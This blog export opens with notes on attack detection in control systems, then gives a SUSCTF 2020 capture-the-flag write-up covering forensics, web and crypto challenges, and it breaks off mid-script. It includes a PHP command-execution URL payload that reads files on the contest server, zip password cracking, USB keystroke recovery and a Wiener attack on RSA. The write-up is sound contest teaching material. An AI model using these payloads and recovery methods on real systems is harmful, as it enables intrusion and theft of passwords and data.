<h4 id="1-4-系统建模"><a href="#1-4-系统建模" class="headerlink" title="1.4 系统建模"></a>1.4 系统建模</h4><p>$$<br>\begin{cases}<br>\dot{x}(t)=Ax(t)+Bu(t)+Dv(t),\<br>y(t)=Cx(t).<br>\end{cases}\tag{1}<br>$$</p>
<p>x 为系统状态，u 为已知输入，v 为未知攻击，y 为可测量的系统输出</p>
<h3 id="2-有限时间检测器"><a href="#2-有限时间检测器" class="headerlink" title="2 有限时间检测器"></a>2 有限时间检测器</h3><p>针对公式 (1) 提出检测器<br>$$<br>\begin{cases}<br>\dot{z}=Fz(t)+HBu(t)+Ly(t),\ \ \ \ \ \ \ \ \ \ \ (观测器状态) \<br>\widehat{x}=M[z(t)-F^{\tau}z(t-\tau)] \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ (系统估计值)<br>\end{cases}\tag{2}<br>$$<br>由可测量的<strong>系统输出</strong>和<strong>已知输入</strong>获取观测器状态，检测器可以在未知攻击的值不为 0 时将其检测出来</p>
<h3 id="3-观测器：对有限时间检测器的改进"><a href="#3-观测器：对有限时间检测器的改进" class="headerlink" title="3 观测器：对有限时间检测器的改进"></a>3 观测器：对有限时间检测器的改进</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2020</title>
    <url>/2020/10/20/SUS2020/</url>
    <content><![CDATA[<h4 id="分数-3287"><a href="#分数-3287" class="headerlink" title="分数 3287"></a>分数 3287</h4><h4 id="排名-15"><a href="#排名-15" class="headerlink" title="排名 15"></a>排名 15</h4><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="[Misc]签到"></a>[Misc]签到</h4><p>SUSCTF{Welcome_t0_SUSCTF}</p>
<h4 id="Misc-爆破鬼才请求出战"><a href="#Misc-爆破鬼才请求出战" class="headerlink" title="[Misc]爆破鬼才请求出战"></a>[Misc]爆破鬼才请求出战</h4><h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>打开会有提示<code>m?s?_?tt4?k!</code><br><img src="/2020/10/20/SUS2020/baopo.png">  </p>
</li>
<li><p>利用ARCHPR掩码攻击获取密码<br><img src="/2020/10/20/SUS2020/%E6%8E%A9%E7%A0%81%E6%94%BB%E5%87%BB.png"><br><code>m4sk_att4Ck!</code>  </p>
</li>
<li><p>解压得到LSB.png，利用StegSolve提取隐写数据，保存成文本，得到<br><code>S&#123;urgdt1&#125;UY_30__sS0a_04mc</code>  </p>
</li>
<li><p>栅栏密码，每组3字<br><code>SUS&#123;Y0u_ar3_g00d_4t_m1sc&#125;</code></p>
</li>
</ol>
<h4 id="Misc-签到之公众号"><a href="#Misc-签到之公众号" class="headerlink" title="[Misc]签到之公众号"></a>[Misc]签到之公众号</h4><p>关注公众号，回复flag<br><code>SUSCTF&#123;W3lc0m3_t0_SUSCTF&#125;</code></p>
<h4 id="Misc-Dance-Dance"><a href="#Misc-Dance-Dance" class="headerlink" title="[Misc]Dance_Dance"></a>[Misc]Dance_Dance</h4><h5 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>图片<br><img src="/2020/10/20/SUS2020/The_dancing_men.png">  </p>
</li>
<li><p>利用<a href="https://www.dcode.fr/dancing-men-cipher%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">https://www.dcode.fr/dancing-men-cipher解密得到</a>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pa sswdL etU  </span><br><span class="line">sdanCe</span><br></pre></td></tr></table></figure></li>
<li><p>根据提示“让我们跟着音乐起舞吧！”，使用<code>binwalk</code>查看是否内含文件，发现zip，故<code>dd if=The_dancing_men.png of=f.zip skip=48243 bs=1</code>将压缩包分离出来  </p>
</li>
<li><p>解压发现需要密码，正是<code>LetUsdanCe</code>  </p>
</li>
<li><p>得到音频文件Do_u_know_spectrum.wav，用Audacity打开，并查看频谱图有：<br><img src="/2020/10/20/SUS2020/spec.png">  </p>
</li>
<li><p>扫描二维码得<br><code>SUS&#123;1nt3r35t1nG_5p3ctRum&#125;</code></p>
</li>
</ol>
<h4 id="Misc-balɟ¯ʇuᴉɹԀ"><a href="#Misc-balɟ¯ʇuᴉɹԀ" class="headerlink" title="[Misc]ƃɐlɟ¯ʇuᴉɹԀ"></a>[Misc]ƃɐlɟ¯ʇuᴉɹԀ</h4><h5 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用010Editor查看发现尾部有类似zip文件头的标志，但整个字节流是倒序的，故利用Python顺过来  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\ti_nepo_ot_woh&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> m:</span><br><span class="line">    m.write(binascii.b2a_hex(f))</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(tmp[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\result.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> result:</span><br><span class="line">    result.write(binascii.a2b_hex(tmp[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>得到一个可以正常解压缩的zip文件result.zip，解压缩得到here_are_some_codes.zip和use_zipin_to_get_password.txt，后者中有以下文本  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyud0ko3aMDa1MttNDoaaunr0NtMtw:moy3aryoimi:uu:0m01aiypiuDaMmukaNrNM?M:M:mnnnt1rmDp?001Nanow:u?kN:0ykkyaMDkyMuDNMpuaNDykNm:NmmMMk1pki0idodmanMimupwwDooiy:i:kodmMOOa?k1witMk:aukiiM:iakDmni3w3?mwioiDooM:wiMrm:m0ooO:OokNMykNNwimOak0ddmopOmymuNo1aM0Mdt1?1Domynmnmw:0:o:uD30mDDyi:Dppi3a0Nmi:yOr??OOkdwwip3wr0u3aw1Mw:irrmtpkMd0n0kyD:3y:odnMDuiDNyaNMpyNykm:puw0?:DNrMoMkMDk3Nk03wtiO0mpoyidymtdiiD3O3Oa1yin?o3wDm3:mamduayD0:?iur?uwn:N001uioDa3Dumd3kukmdadmOaodn:iioy:nimnauu31nk0tda?rpoi1i1ioMOmi0MyyMktmNM::mOi3oMyMwMopoMtMu?ka:nmM3D:NyydpuymN1pO0mwoymraDiymMOd:pODuMmy0nDOMO0id3:ydDdrkNi0yoD1imOoDm0kinwyMi?MONm0Nyood:ONDdi:oyw0OM1:?:w?pitkOoa0:dtraiurNyyrN3uw1uwMyDtp10Ma:MMo:moMirupDmioOadOitwDt:yy0D:i3Na:naoMatra1uMrNwndiku3m?mOuda:OM1wnyourkau1dDw:oM:1myoNNDkk:ka3p?rywDwiakDa3d:i0Mo3a3M3aMkry0ionkmO3:?waO:MM0MNNymar3pmudwompwuoo0mOOyDNak1aDiow13yr?mNikw?royu?p1Dkm1k:DDmktty1rrMp?yw3y3kmtpyd:maiwDN0nDOMMkDdy:watMkidu:D:Mi0w00aN:ku:1:a:npaNOD:MpwODaiaDu:dMoaDmayOmwwMtw:0DuM3u?:po0iN:adrt0up?ONiND?nNmtDdronmaOMinm0:miMDyddMpk?doMdi0pNOyoMMuiwt0m3at0uDuid0Nm0iiyi:uOONdiOr3tMpn:kri3kpomioMDmN1Oadaai3Mmwa10OrwriiON:0:uuiDkD?r:iynuMui0yiarMy:O:yMp?mdkDDo33ay:pMnanNDo3nkoiOapt:1MNkr0Di?0mkr0yy:NauatDao0aim0w3i:Op0aikwDmmuoimnyr:Nuo:p3no0yy3apauDua0w0mo0u?3Nup?mo:3NMDwNDtudyi3D:d1DmNaykn1MOMwo?OMpodna1D0:wm0kiDrr?o?ppuwu:tNykDpkpNttnunurd11ptwamrnm3k0a:i1pOpu0mMtua331Ou3OMaONkMaDrMptDO30yDrd1duooOuNODkNkNmi1N0MMiOadmymNnOkwM0MMDkMMMraa1dtwuoDd0a:wkm300O0ymD1w13:oDNayw0i0a0My130Oim0?0urro3OOMp3ukDaiiymnr</span><br></pre></td></tr></table></figure></li>
<li><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">字频统计</a>发现,，按频率从高到底有：  <code>Mima:D0youkNOw3dpr1nt?</code>  </p>
</li>
<li><p>解压成功，获得sus文件，内有G代码，拿到<a href="http://nraynaud.github.io/webgcode">http://nraynaud.github.io/webgcode</a> 执行，Front面有flag，多找两个面放大即可看到被挡住的字符了<br><img src="/2020/10/20/SUS2020/3D.png"><br><code>SUS&#123;3D_Pr1nting_1s_Great&#125;</code>  </p>
</li>
</ol>
<h4 id="Misc-抓住那只小老鼠"><a href="#Misc-抓住那只小老鼠" class="headerlink" title="[Misc]抓住那只小老鼠"></a>[Misc]抓住那只小老鼠</h4><h5 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>用010Editor查看文件，发现尾部有提示：<br><code>D0 y0u Kn0wPseudo encryption?</code></p>
</li>
<li><p>故为zip伪加密，找到504b0102后加密标志位（除了里面包含的一个zip文件外）改为0000，可正常解压，得到keyboard.pcapng和这个小老鼠竟然是个右撇子.zip  </p>
</li>
<li><p>得到的zip仍为加密的，猜测密码应在keyboard.pcapng中  </p>
</li>
<li><p><a href="https://blog.csdn.net/qq_36609913/article/details/78578406">参考1</a><br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">参考2</a><br>从键盘流量中获取信息并导出到usbdata.txt：<code>tshark -r keyboard.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure>

<p><code>PASSWORD  L3T-U5-L00K-4T-TH3-R1GHT-BUTT0N</code><br>实际上应该为小写。。。。l3t-u5-l00k-4t-th3-r1ght-butt0n</p>
<ol start="5">
<li>通过以上密码可直接解压第二个zip，分析mouse.pcapng数据，<code>tshark -r mouse.pcapng -T fields -e usb.capdata &gt; mousedata.txt</code>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;mousedata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line">    <span class="comment"># right button</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :</span><br><span class="line">        <span class="built_in">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>

<p><code>python mouseexp.py &gt; xy.txt</code>得到坐标文本  </p>
<ol start="6">
<li>gnuplot进入，然后<code>plot &quot;xy.txt&quot;</code>得到<br><img src="/2020/10/20/SUS2020/flag.png">  </li>
<li>之前没注意到是右键，采到的左键数据镜像过来是fakeflag，淦。。  </li>
<li>搞错了，刚刚是左键数据，用右键重画一次，垂直镜像一下就能看到<br><img src="/2020/10/20/SUS2020/rotateTrueFlag.png"><br><code>SUS&#123;Hiahia_G0t_1t!&#125;</code></li>
</ol>
<h4 id="Misc-fix-fo"><a href="#Misc-fix-fo" class="headerlink" title="[Misc]fix_fo"></a>[Misc]fix_fo</h4><h5 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>将文件头60改成50即可正常解压  </li>
<li>得到文本<br><code>新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</code>  </li>
<li>用<a href="http://hi.pcmoe.net/buddha.html">新佛曰</a>解密<br><code>SUS&#123;Ta1k_w1th_F0&#125;</code></li>
</ol>
<h4 id="Misc-你还好吗？"><a href="#Misc-你还好吗？" class="headerlink" title="[Misc]你还好吗？"></a>[Misc]你还好吗？</h4><h5 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>解压后发现密码被加密了，用<a href="https://www.splitbrain.org/services/ook">ook解密</a>得到<br><code>Ar3_y0u_OK??</code>  </li>
<li>用其解压Sus.7z得到png，根据提示知其高度不够导致crc校验过不了，用010editor打开，猜测差不多高就直接将高度改为0196就成功了（不行就CRC爆破）<br><img src="/2020/10/20/SUS2020/height.png">  </li>
<li>打开得到flag<br><img src="/2020/10/20/SUS2020/auok.png"><br><code>SUS&#123;wuhu_y0u_f1nD_m3&#125;</code>  </li>
</ol>
<h4 id="Web-Sign-in"><a href="#Web-Sign-in" class="headerlink" title="[Web]Sign_in"></a>[Web]Sign_in</h4><h5 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>直接转到题目地址，有<br><img src="/2020/10/20/SUS2020/%E4%BD%A0%E7%9F%A5%E9%81%93%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%90%97.png">  </li>
<li>F12 - Network - CTRL R<br><img src="/2020/10/20/SUS2020/network.png">  </li>
<li>点击susctf.com，Headers即可查看flag<br><img src="/2020/10/20/SUS2020/header.png"><br><code>SUSCTF&#123;752a426b72b98bf7eda6d5cc53174a5e&#125;</code></li>
</ol>
<h4 id="Web-Script-Kiddle"><a href="#Web-Script-Kiddle" class="headerlink" title="[Web]Script_Kiddle"></a>[Web]Script_Kiddle</h4><h5 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>右键查看源码发现按钮会生成1000以内随机数，且console会回显文本  </li>
<li>F12 - console  </li>
<li>一直“揍他！”就可以拿flag<br><img src="/2020/10/20/SUS2020/%E6%8F%8D%E4%BB%96.png"><br><code>SUSCTF&#123;4cded8ce3b7cdf6e8b44a030dfa15b27&#125;</code></li>
</ol>
<h4 id="Web-刀来！"><a href="#Web-刀来！" class="headerlink" title="[Web]刀来！"></a>[Web]刀来！</h4><h5 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址<br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5.png">  </li>
<li>可以直接执行命令所以<code>http://susctf.com:10005/?z33=system(%22ls%22);</code><br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5ls.png">  </li>
<li>全是文件，也cat不到flag，所以不停往上一级目录查看，直到<code>http://susctf.com:10005/?z33=system(%22ls%20../../../%22);</code><br><img src="/2020/10/20/SUS2020/%E4%B8%89%E7%BA%A7%E7%9B%AE%E5%BD%95.png">  </li>
<li><code>http://susctf.com:10005/?z33=system(%22cat%20../../../flag%22);</code><br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5cat.png">  <blockquote>
<p>SUSCTF{f5f397a37b728d927576ae889b908d17}  </p>
</blockquote>
</li>
</ol>
<h4 id="Web-AT-Field"><a href="#Web-AT-Field" class="headerlink" title="[Web]AT_Field"></a>[Web]AT_Field</h4><h5 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址，输入框只允许2个字符，故F12修改长度为4  </li>
<li>输入flag，点击按钮发现不给flag，直接回车拿到了<br><code>SUSCTF&#123;b8442b229c248ab68061f4602e7e0649&#125;</code></li>
</ol>
<h4 id="Web-first-lesson"><a href="#Web-first-lesson" class="headerlink" title="[Web]first_lesson"></a>[Web]first_lesson</h4><h5 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>后回显  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z33 is feiwu</span><br><span class="line">rmb is shenxian</span><br><span class="line">use POST method to submit aa </span><br></pre></td></tr></table></figure></li>
<li><p>打开Fiddler，点击左下角开始capturing，刷新<code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>，双击新出现的结果<br><img src="/2020/10/20/SUS2020/fiddler.png">  </p>
</li>
<li><p>复制get请求内容<br><img src="/2020/10/20/SUS2020/get.png">  </p>
</li>
<li><p>POST数据，注意添加content-type，且&amp;用url编码<br><img src="/2020/10/20/SUS2020/post.png">  </p>
</li>
<li><p>execute并查看结果  </p>
</li>
<li><p>解码<br><img src="/2020/10/20/SUS2020/decode.png">  </p>
</li>
<li><p>在textview中查看<br><img src="/2020/10/20/SUS2020/whois.png"></p>
</li>
</ol>
<h4 id="Crypto-嘤语"><a href="#Crypto-嘤语" class="headerlink" title="[Crypto]嘤语"></a>[Crypto]嘤语</h4><h5 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>注意到后面两个月亮表情对应左右花括号，猜测最后一句话是flag的密文，同时花括号前面有六个字符，应该就是SUSCTF，看1和3字符重复，验证了猜想基本正确  </li>
<li>因为开着PyCharm就正好直接拿进来CTRL R做替换了，替换思路是：先将SUSCTF对应的表情替换掉，发现前面还有个<code>F***:</code>显然是对应”FLAG”，然后有”表情+F”的组合是”OF”，再对其他字符做填充，如CLASSICAL，CIPHER等，就可以逐渐恢复出flag了  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&quot;I😊⬜CRYPTOGRAPHY,⬜A⬜CLASSICAL⬜CIPHER⬜IS⬜A⬜TYPE⬜OF⬜CIPHER⬜THAT⬜😴AS⬜USE🙃⬜HISTORICALLY⬜😅UT⬜😊O😴⬜HAS⬜FALLE😊,⬜FOR⬜THE⬜😭OST⬜PART,⬜I😊TO⬜🙃ISUSE.⬜I😊⬜CO😊TRAST⬜TO⬜😭O🙃ER😊⬜CRYPTOGRAPHIC⬜ALGORITH😭S,⬜😭OST⬜CLASSICAL⬜CIPHERS⬜CA😊⬜😅E⬜PRACTICALLY⬜CO😭PUTE🙃⬜A😊🙃⬜SOL😮E🙃⬜😅Y⬜HA😊🙃.⬜HO😴E😮ER,⬜THEY⬜ARE⬜ALSO⬜USUALLY⬜😮ERY⬜SI😭PLE⬜TO⬜😅REA😷⬜😴ITH⬜😭O🙃ER😊⬜TECH😊OLOGY.⬜THE⬜TER😭⬜I😊CLU🙃ES⬜THE⬜SI😭PLE⬜SYSTE😭S⬜USE🙃⬜SI😊CE⬜GREE😷⬜A😊🙃⬜RO😭A😊⬜TI😭ES,⬜THE⬜ELA😅ORATE⬜RE😊AISSA😊CE⬜CIPHERS,⬜😴ORL🙃⬜😴AR⬜II⬜CRYPTOGRAPHY⬜SUCH⬜AS⬜THE⬜E😊IG😭A⬜😭ACHI😊E⬜A😊🙃⬜😅EYO😊🙃.⬜HERE⬜IS⬜YOUR⬜FLAG:⬜SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;.&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;</code></p>
<h4 id="Crypto-RSSA"><a href="#Crypto-RSSA" class="headerlink" title="[Crypto]RSSA"></a>[Crypto]RSSA</h4><h5 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>大数分解，拿去factor和yafu都解不出来，所以<a href="http://yulige.top/?p=752#childRSA213pt_38solvers">Pollard p-1</a>  </li>
<li>因为hint值太大了，这就意味着d2会很小，那么就是<a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener攻击</a>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> generalProject.rsa_wiener_attack.RSAwienerHacker <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">3060339854667248593045439268471563618105947041290938481437325848798323938532596377624638621097456963253037677560878331946238549090696901239603144752351327600586368201100237434726169753646811787604853964860726798254336863499145531199565109074254779876690101270258127715336168391612300304331101360275482233310674932139807609972793497538656646848415992324215456226007567101761161788925814705494294400067939912005412022042668218198383402940130898294895649777977189323224263157282092376424922614684186453440072575716268919964175691720756763119457242056477670177079759247122219232189306055203008434843682933286646266213545529</span></span><br><span class="line">c1 = <span class="number">3034469135294668773920507296346350907742457191809402478651651217514955247855057533285593352174358500799066186911877764529883001921082777805708529058571202933977282137208978346424554431043278549161483292409933547041813315975823969433401643242339079668276684778997460119485703198793575336626432882752487489338573038850368920863161207166964460908530752241974904789636070196624073568755921923220050851726340905458096183125781252224795386550130576788381853678417208871830497382705959067939298640356768911183934418681683145007224744048971106742284638285450915496700589787964160222024466744139469925581347695004377624495126915</span></span><br><span class="line">n2 = <span class="number">10807879892068351137882646909051489249635133849135554246405938629884200521475944531591568601618793402948721935425608627699981096326141738901035519331102707539920513581542001947790197240207566927971678513209908723244407016045630599048822569018427598397968961619045802981482548829222463503036924385721648266628299260991104729336073926580607199543174083380805549563817814412425939068641770601855910658492094090168370370854773061021846017875357170911444961167591295893582538961911101048500175084293595051999904087614747835111979609341806717723922618200228638905661136101116560894773115822777483505620089698306929561785323</span></span><br><span class="line">c2 = <span class="number">9683205078328252218032269702345643329971829786690479639266538047554486626818807182948959694083494415321749771694962705383395520313360833790060850924741844334210061457412714409510396570202504721712360741707661477563359914632426508418800225158732852097973890339230747236123801365622331935944566042700904386015421937836728697959613396426201564885786343062950855931133983926321168463148165960442802306229736368651402634294933332130289754301101314108768581240883792427050189942403534268596623333863094794374201347799653298070303061655891582667320043298218647231196611752237350024535657749266580570143793917557001539320495</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 